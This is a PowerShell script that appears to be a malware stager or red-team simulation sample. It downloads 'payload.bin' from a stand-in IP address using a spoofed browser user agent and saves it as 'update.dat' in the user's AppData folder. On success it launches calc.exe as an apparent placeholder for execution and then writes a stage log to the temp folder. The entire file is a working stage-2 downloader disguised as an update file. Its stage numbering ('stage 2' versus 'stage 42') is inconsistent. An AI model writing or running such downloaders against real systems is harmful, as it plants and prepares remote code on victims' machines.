[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://198.51.100.3:8080/downloads/payload.bin',
    [string]$DownloadPath = "$env:APPDATA\update.dat",
    [int]$ConnectionTimeout = 212,
    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Invoke-PayloadFetch -SourceUrl $FetchUrl -DestinationPath $DownloadPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
if ($OperationResult) {
    Start-Process -FilePath "calc.exe"
}

Write-Output "stage 42 initialized"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
